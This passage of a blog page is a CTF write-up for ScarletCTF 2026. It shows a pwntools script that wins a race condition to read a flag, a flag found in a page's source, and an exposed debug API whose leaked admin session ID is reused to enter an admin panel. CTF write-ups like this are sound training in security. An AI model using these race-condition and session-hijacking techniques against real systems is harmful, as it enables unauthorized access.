+</span></span></code></pre></div><p>It takes the user input using <code>fgets</code> and uses <code>strncmp</code> to compare the input to <code>supersecret\n</code> (<code>\n</code> is just a newline character).</p>
+<p>If it matches then the variable <code>is_admin</code> is set to <code>1</code>. BUT!!! right away, it creates a new thread that executes <code>logout_thread</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>[..]
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#define WAIT_TIME 1000
+</span></span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[..]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">logout_thread</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>arg) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">usleep</span>(WAIT_TIME);
+</span></span><span style="display:flex;"><span>    is_admin <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> NULL;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>According to the manual of <code>usleep</code>, it suspends execution for microsecond intervals; in this case, 1000 microseconds or 1 millisecond. Then the variable <code>is_admin</code> is set to <code>0</code> again.</p>
+<p>Now with all of this, my idea was to read <code>log[0]</code> before the variable <code>is_admin</code> is set back to <code>0</code> (false).</p>
+<p>So I finally tried <strong>pwntools</strong>!!!</p>
+<p>In the end, I had this super simple python script.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challs.ctf.rusec.club&#34;</span>, <span style="color:#ae81ff">22169</span>)
+</span></span><span style="display:flex;"><span>secret <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;supersecret&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># r.sendlineafter(&#39;Admin password: &#39;, secret) Note: For some reason this doesn&#39;t work although in theory it should because it&#39;s just a combination of recvuntil and sendline</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Admin password: &#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(secret)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;3&#34;</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>response <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()<span style="color:#f92672">.</span>decode()
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># print(f&#34;response: {response}&#34;)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>It connects to the challenge server, then sends <code>1</code> to login as admin, and enters <code>supersecret</code> when it receives the string &ldquo;Admin password: &ldquo;. Then, it immediately sends <code>3</code> to read a log and <code>0</code> to try and read <code>log[0]</code>, which contains the flag.</p>
+<p>Do <strong>note</strong> that <code>sendline</code> automatically adds a new line <code>\n</code> so we don&rsquo;t need it for the <code>secret</code>. Also, I think this PoC can be improved. Unfortunately, I&rsquo;m only able to retrieve the flag if I use <code>interactive()</code> but I think it should be possible without that. Welp it works so ig it&rsquo;s okay.</p>
+<pre tabindex="0"><code>RUSEC{wow_i_did_a_data_race}
+</code></pre><p><img src="/images/speedjournal.png" alt="Image Description"></p>
+<p>This was a super fun challenge!!!</p>
+<p>Addition to my original writeup: Turns out, the PoC can indeed be improve, I think the PoC in this writeup is the best: <a href="https://ctf.krauq.com/scarletctf-2026#speedjournal">https://ctf.krauq.com/scarletctf-2026#speedjournal</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;challs.ctf.rusec.club&#34;</span>, <span style="color:#ae81ff">22169</span>)
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pipeline all commands in a single send to win the race</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">supersecret</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">3</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(r<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)<span style="color:#f92672">.</span>decode())
+</span></span></code></pre></div><p>Interesting, I hadn&rsquo;t really thought of sending all of the required input at once. So <code>\n</code> can be super helpful huh. Also, my guess before that I don&rsquo;t need to use <code>interactive()</code> was right too. From my understanding, <code>recvall</code> receives pretty much everything, including the flag. I haven&rsquo;t stumbled upon this function before, so I need to read more!</p>
+<h1 id="webcommentary">Web/Commentary</h1>
+<blockquote>
+<p>You&rsquo;re currently speaking to my favorite host right now (ctf.rusec.club), but who&rsquo;s to say you even had to speak with one?
+Sometimes, the treasure to be found is just bloat that people forgot to remove.</p>
+</blockquote>
+<p><em>Challenge Description</em></p>
+<p>Based on &ldquo;my favorite host right now (ctf.rusec.club)&rdquo;, I immediately assumed that it has something to do with domains, so I used <code>dig</code> on <code>ctf.rusec.club</code>. The output returns an IP Address &ldquo;<strong>5.161.91.13</strong>&rdquo;, and walahh :) accessing the IP Address directly returns an nginx page.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@24:~# dig ctf.rusec.club
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.39-0ubuntu0.24.04.2-Ubuntu &lt;&lt;&gt;&gt; ctf.rusec.club
+</span></span><span style="display:flex;"><span>;; global options: +cmd
+</span></span><span style="display:flex;"><span>;; Got answer:
+</span></span><span style="display:flex;"><span>;; -&gt;&gt;HEADER<span style="color:#e6db74">&lt;&lt;- opco</span>de: QUERY, status: NOERROR, id: <span style="color:#ae81ff">25531</span>
+</span></span><span style="display:flex;"><span>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; OPT PSEUDOSECTION:
+</span></span><span style="display:flex;"><span>; EDNS: version: 0, flags:; udp: <span style="color:#ae81ff">65494</span>
+</span></span><span style="display:flex;"><span>;; QUESTION SECTION:
+</span></span><span style="display:flex;"><span>;ctf.rusec.club.                        IN      A
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; ANSWER SECTION:
+</span></span><span style="display:flex;"><span>ctf.rusec.club.         <span style="color:#ae81ff">147</span>     IN      A       5.161.91.13
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">1</span> msec
+</span></span><span style="display:flex;"><span>;; SERVER: 127.0.0.53#53<span style="color:#f92672">(</span>127.0.0.53<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>;; WHEN: Fri Jan <span style="color:#ae81ff">09</span> 18:59:14 UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">59</span>
+</span></span></code></pre></div><p>I checked the page source and I got the flag :D</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">you</span> <span style="color:#a6e22e">found</span> <span style="color:#a6e22e">me</span> <span style="color:#f92672">:</span><span style="color:#ae81ff">3</span> <span style="color:#f92672">--!&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--</span> <span style="color:#a6e22e">RUSEC</span>{<span style="color:#a6e22e">truly_the_hardest_ctf_challenge</span>} <span style="color:#f92672">--!&gt;</span>
+</span></span></code></pre></div><p><img src="/images/Commentary.png" alt="Image Description"></p>
+<h1 id="webcampus-one">Web/Campus One</h1>
+<p><strong>I wasn&rsquo;t able to finish this one, because I got stuck at the SQL injection part T_T. Still, I think it&rsquo;s interesting so I&rsquo;m writing until the part I didn&rsquo;t finish.</strong></p>
+<p>The application itself doesn&rsquo;t seem to have any interesting features, so I decided to check the <strong>JavaScript</strong> files instead, to look for hidden paths.</p>
+<p>I found an interesting endoint on <a href="https://campus-one.ctf.rusec.club/_next/static/chunks/app/page-9a097ac5194841e0.js">https://campus-one.ctf.rusec.club/_next/static/chunks/app/page-9a097ac5194841e0.js</a>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>window.<span style="color:#a6e22e">CAMPUS_CONFIG</span> <span style="color:#f92672">=</span> {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">env</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;production&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">build_id</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;edu_v4.2.0&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">debug_endpoint</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;/api/v2/debug/sessions&#34;</span>,
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">flags</span><span style="color:#f92672">:</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">student_discount</span><span style="color:#f92672">:</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">admin_portal</span><span style="color:#f92672">:</span> <span style="color:#f92672">!</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>	}
+</span></span></code></pre></div><p><img src="/images/CampusOne.png" alt="Image Description"></p>
+<p>So I tried to send a <strong>GET</strong> request to <strong>/api/v2/debug/sessions</strong>, but it keeps on returning <strong>403 Forbidden</strong> &ldquo;<strong>Access Denied</strong>&rdquo;. At first I thought this must be a trap to confuse the players, but&hellip;after a while, I figured I need to try downgrading the version so <strong>/api/v1/debug/sessions</strong>. And it worked!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">GET</span> /api/v1/debug/sessions <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">campus-one.ctf.rusec.club</span>
+</span></span></code></pre></div><p><img src="/images/CampusOne-2.png" alt="Image Description"></p>
+<p>Then, I made a <strong>match and replace</strong> rule to automatically use the admin&rsquo;s <code>sessionId</code>. Next was pure intuition haha, I now have the admin&rsquo;s <code>sessionId</code>, so the next thing is to&hellip;of course! access the admin panel(if there is one lol). I tried the most basic thing to try, simply go to <strong>/admin</strong> and good thing it exists.</p>
+<p><img src="/images/CampusOne-3.png" alt="Image Description"></p>
+<p>I checked the &ldquo;<strong>System Settings</strong>&rdquo; and immediately thought of SQL injection, but since I wasn&rsquo;t able to solve it, my writeup ends here :(</p>
+<p>If you want, here&rsquo;s a complete writeup for this challenge: <a href="https://ctf.krauq.com/scarletctf-2026#campus-one">https://ctf.krauq.com/scarletctf-2026#campus-one</a></p>
+<hr>
+<p>This was super fun! The challenge I had the most fun with and learned the most from is probably &ldquo;<strong>speedjournal</strong>&rdquo;. Reading the code, realizing that it was a Race Condition, learning how to use pwntools(it&rsquo;s my first time xD), and finally getting the flag felt amazing.</p>
+<p>Thanks to <a href="https://ctftime.org/team/226444">ScarletCTF</a> for organizing this event :D</p>
+<p><em><strong>-Datsuraku147</strong></em></p>
+
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
+    <span class="footer_item"> </span>
+    &nbsp;
+
+    <div class="footer_social-icons">
+<a href="http://github.com/datsuraku147" target="_blank" rel="noopener noreferrer me"
+    title="Github">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+</a>
+<a href="https://x.com/MDatsuraku" target="_blank" rel="noopener noreferrer me"
+    title="Twitter">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z">
+    </path>
+</svg>
+</a>
+<a href="/index.xml" target="_blank" rel="noopener noreferrer me"
+    title="Rss">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path d="M4 11a9 9 0 0 1 9 9" />
+    <path d="M4 4a16 16 0 0 1 16 16" />
+    <circle cx="5" cy="19" r="1" />
+</svg>
+</a>
+</div>
+    <small class="footer_copyright">
+        © 2026 Datsuraku.
+        Powered by <a href="https://github.com/hugo-sid/hugo-blog-awesome" target="_blank" rel="noopener">Hugo blog awesome</a>.
+    </small>
+</footer><a href="#" title="Go to top" id="totop">
+    <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" fill="currentColor" stroke="currentColor" viewBox="0 96 960 960">
+    <path d="M283 704.739 234.261 656 480 410.261 725.739 656 677 704.739l-197-197-197 197Z"/>
+</svg>
+
+</a>
+
+
+    
+
+
+
+
+
+
+    
+    <script async src="http://localhost:1313/js/main.js" ></script>
+
+    
+
+</body>
+</html>
